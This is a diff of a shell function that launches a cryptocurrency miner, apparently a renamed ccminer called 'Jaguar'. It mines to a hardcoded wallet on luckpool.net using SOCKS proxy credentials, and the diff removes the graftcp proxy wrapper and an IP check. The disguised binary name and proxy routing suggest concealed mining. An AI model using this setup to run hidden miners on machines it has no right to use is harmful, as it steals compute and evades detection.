@@ -21,25 +21,8 @@ run_ccminer() {
   pkill -f 'Jaguar'
   sleep 2  # Wait to ensure all processes are terminated
 
-  # Set up graftcp configuration
-  cat > /root/graftcp/local/graftcp-local.conf <<END
-loglevel = 1
-socks5 = $proxy
-socks5_username = $username
-socks5_password = $password
-END
-
-  # Start graftcp local proxy
-  /usr/bin/graftcp-local -config /root/graftcp/local/graftcp-local.conf &
-  sleep .2
-
-  # Check public IP using the proxy
-  /usr/bin/graftcp curl ifconfig.me
-  echo " "
-  echo " "
-
   # Run Jaguar with the selected proxy
-  /usr/bin/graftcp /root/Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads 4 --proxy $username:$password@$proxy &
+  ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads 4 --proxy $username:$password@$proxy &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
